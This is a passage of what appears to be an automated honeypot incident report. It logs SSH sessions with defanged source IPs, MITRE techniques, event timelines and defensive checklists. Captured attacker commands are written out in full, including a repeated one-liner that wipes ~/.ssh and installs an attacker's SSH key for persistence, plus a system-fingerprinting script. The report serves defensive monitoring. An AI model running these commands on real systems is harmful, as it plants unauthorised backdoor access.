| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:32:58` | `cowrie.session.connect` |
| `2026-09-03 16:32:58` | `cowrie.client.version` |
| `2026-09-03 16:32:58` | `cowrie.client.kex` |
| `2026-09-03 16:32:58` | `cowrie.login.success` |
| `2026-09-03 16:32:59` | `cowrie.session.params` |
| `2026-09-03 16:32:59` | `cowrie.command.input` |
| `2026-09-03 16:32:59` | `cowrie.command.failed` |
| `2026-09-03 16:32:59` | `cowrie.log.closed` |
| `2026-09-03 16:32:59` | `cowrie.session.params` |
| `2026-09-03 16:32:59` | `cowrie.command.input` |
| `2026-09-03 16:33:00` | `cowrie.session.file_download` |
| `2026-09-03 16:33:00` | `cowrie.log.closed` |
| `2026-09-03 16:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.207.48[.]99` to AbuseIPDB if not already reported
- [ ] Block `187.207.48[.]99` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a255177f5dc

| Field | Detail |
|---|---|
| **Source IP** | `187.207.48[.]99` |
| **First Seen** | 2026-09-03 16:33 |
| **Last Seen** | 2026-09-03 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:33:00` | `cowrie.session.connect` |
| `2026-09-03 16:33:00` | `cowrie.client.version` |
| `2026-09-03 16:33:00` | `cowrie.client.kex` |
| `2026-09-03 16:33:00` | `cowrie.login.success` |
| `2026-09-03 16:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.207.48[.]99` to AbuseIPDB if not already reported
- [ ] Block `187.207.48[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7bc4e177d1

| Field | Detail |
|---|---|
| **Source IP** | `187.207.48[.]99` |
| **First Seen** | 2026-09-03 16:33 |
| **Last Seen** | 2026-09-03 16:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:33:00` | `cowrie.session.connect` |
| `2026-09-03 16:33:00` | `cowrie.client.version` |
| `2026-09-03 16:33:00` | `cowrie.client.kex` |
| `2026-09-03 16:33:01` | `cowrie.login.success` |
| `2026-09-03 16:33:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.207.48[.]99` to AbuseIPDB if not already reported
- [ ] Block `187.207.48[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b174d388178

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:33 |
| **Last Seen** | 2026-09-03 16:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:33:14` | `cowrie.session.connect` |
| `2026-09-03 16:33:16` | `cowrie.client.version` |
| `2026-09-03 16:33:16` | `cowrie.client.kex` |
| `2026-09-03 16:33:21` | `cowrie.login.success` |
| `2026-09-03 16:33:22` | `cowrie.session.params` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.success` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.command.input` |
| `2026-09-03 16:33:22` | `cowrie.log.closed` |
| `2026-09-03 16:33:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e2548f78273

| Field | Detail |
|---|---|
| **Source IP** | `218.51.148[.]194` |
| **First Seen** | 2026-09-03 16:36 |
| **Last Seen** | 2026-09-03 16:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:36:06` | `cowrie.session.connect` |
| `2026-09-03 16:36:06` | `cowrie.client.version` |
| `2026-09-03 16:36:06` | `cowrie.client.kex` |
| `2026-09-03 16:36:07` | `cowrie.login.success` |
| `2026-09-03 16:36:08` | `cowrie.session.params` |
| `2026-09-03 16:36:08` | `cowrie.command.input` |
| `2026-09-03 16:36:08` | `cowrie.command.failed` |
| `2026-09-03 16:36:08` | `cowrie.log.closed` |
| `2026-09-03 16:36:09` | `cowrie.session.params` |
| `2026-09-03 16:36:09` | `cowrie.command.input` |
| `2026-09-03 16:36:09` | `cowrie.session.file_download` |
| `2026-09-03 16:36:09` | `cowrie.log.closed` |
| `2026-09-03 16:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.51.148[.]194` to AbuseIPDB if not already reported
- [ ] Block `218.51.148[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-250b478b1de0

| Field | Detail |
|---|---|
| **Source IP** | `218.51.148[.]194` |
| **First Seen** | 2026-09-03 16:36 |
| **Last Seen** | 2026-09-03 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:36:09` | `cowrie.session.connect` |
| `2026-09-03 16:36:09` | `cowrie.client.version` |
| `2026-09-03 16:36:09` | `cowrie.client.kex` |
| `2026-09-03 16:36:10` | `cowrie.login.success` |
| `2026-09-03 16:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.51.148[.]194` to AbuseIPDB if not already reported
- [ ] Block `218.51.148[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-572e7f358051

| Field | Detail |
|---|---|
| **Source IP** | `218.51.148[.]194` |
| **First Seen** | 2026-09-03 16:36 |
| **Last Seen** | 2026-09-03 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:36:10` | `cowrie.session.connect` |
| `2026-09-03 16:36:10` | `cowrie.client.version` |
| `2026-09-03 16:36:11` | `cowrie.client.kex` |
| `2026-09-03 16:36:11` | `cowrie.login.success` |
| `2026-09-03 16:36:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.51.148[.]194` to AbuseIPDB if not already reported
- [ ] Block `218.51.148[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9911e88c85c1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:36 |
| **Last Seen** | 2026-09-03 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:36:17` | `cowrie.session.connect` |
| `2026-09-03 16:36:17` | `cowrie.client.version` |
| `2026-09-03 16:36:17` | `cowrie.client.kex` |
| `2026-09-03 16:36:17` | `cowrie.login.success` |
| `2026-09-03 16:36:18` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:36:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:36:18` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:36:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-155b36f449af

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:36 |
| **Last Seen** | 2026-09-03 16:36 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:36:33` | `cowrie.session.connect` |
| `2026-09-03 16:36:34` | `cowrie.client.version` |
| `2026-09-03 16:36:34` | `cowrie.client.kex` |
| `2026-09-03 16:36:41` | `cowrie.login.success` |
| `2026-09-03 16:36:42` | `cowrie.session.params` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.success` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.command.input` |
| `2026-09-03 16:36:42` | `cowrie.log.closed` |
| `2026-09-03 16:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6594e0002e60

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:39 |
| **Last Seen** | 2026-09-03 16:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:39:43` | `cowrie.session.connect` |
| `2026-09-03 16:39:44` | `cowrie.client.version` |
| `2026-09-03 16:39:44` | `cowrie.client.kex` |
| `2026-09-03 16:39:49` | `cowrie.login.success` |
| `2026-09-03 16:39:51` | `cowrie.session.params` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.success` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.command.input` |
| `2026-09-03 16:39:51` | `cowrie.log.closed` |
| `2026-09-03 16:39:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8fcdbfc49e5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:42 |
| **Last Seen** | 2026-09-03 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:42:23` | `cowrie.session.connect` |
| `2026-09-03 16:42:23` | `cowrie.client.version` |
| `2026-09-03 16:42:23` | `cowrie.client.kex` |
| `2026-09-03 16:42:24` | `cowrie.login.success` |
| `2026-09-03 16:42:24` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:42:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:42:25` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c616a7535c1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:42 |
| **Last Seen** | 2026-09-03 16:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:42:43` | `cowrie.session.connect` |
| `2026-09-03 16:42:45` | `cowrie.client.version` |
| `2026-09-03 16:42:45` | `cowrie.client.kex` |
| `2026-09-03 16:42:49` | `cowrie.login.success` |
| `2026-09-03 16:42:50` | `cowrie.session.params` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.success` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.command.input` |
| `2026-09-03 16:42:50` | `cowrie.log.closed` |
| `2026-09-03 16:42:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e536e3a0e250

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:45 |
| **Last Seen** | 2026-09-03 16:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:45:37` | `cowrie.session.connect` |
| `2026-09-03 16:45:38` | `cowrie.client.version` |
| `2026-09-03 16:45:38` | `cowrie.client.kex` |
| `2026-09-03 16:45:42` | `cowrie.login.success` |
| `2026-09-03 16:45:44` | `cowrie.session.params` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.success` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.command.input` |
| `2026-09-03 16:45:44` | `cowrie.log.closed` |
| `2026-09-03 16:45:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8322d7fd4df

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:47 |
| **Last Seen** | 2026-09-03 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:47:07` | `cowrie.session.connect` |
| `2026-09-03 16:47:07` | `cowrie.client.version` |
| `2026-09-03 16:47:07` | `cowrie.client.kex` |
| `2026-09-03 16:47:08` | `cowrie.login.success` |
| `2026-09-03 16:47:08` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:47:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:47:08` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08a9d32d6fdb

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-09-03 16:48 |
| **Last Seen** | 2026-09-03 16:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:48:33` | `cowrie.session.connect` |
| `2026-09-03 16:48:35` | `cowrie.client.version` |
| `2026-09-03 16:48:35` | `cowrie.client.kex` |
| `2026-09-03 16:48:40` | `cowrie.login.success` |
| `2026-09-03 16:48:41` | `cowrie.session.params` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.success` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:41` | `cowrie.command.input` |
| `2026-09-03 16:48:42` | `cowrie.log.closed` |
| `2026-09-03 16:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfb328137334

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 16:51 |
| **Last Seen** | 2026-09-03 16:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:51:58` | `cowrie.session.connect` |
| `2026-09-03 16:51:58` | `cowrie.client.version` |
| `2026-09-03 16:51:59` | `cowrie.client.kex` |
| `2026-09-03 16:51:59` | `cowrie.login.success` |
| `2026-09-03 16:52:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 16:52:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 16:52:00` | `cowrie.direct-tcpip.data` |
| `2026-09-03 16:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2583a2092a3d

| Field | Detail |
|---|---|
| **Source IP** | `68.178.166[.]175` |
| **First Seen** | 2026-09-03 16:54 |
| **Last Seen** | 2026-09-03 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 16:54:10` | `cowrie.session.connect` |
| `2026-09-03 16:54:10` | `cowrie.client.version` |
| `2026-09-03 16:54:10` | `cowrie.client.kex` |
| `2026-09-03 16:54:11` | `cowrie.login.success` |
| `2026-09-03 16:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.178.166[.]175` to AbuseIPDB if not already reported
- [ ] Block `68.178.166[.]175` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e30ec6a82c2

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-09-03 16:54 |
| **Last Seen** | 2026-09-03 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
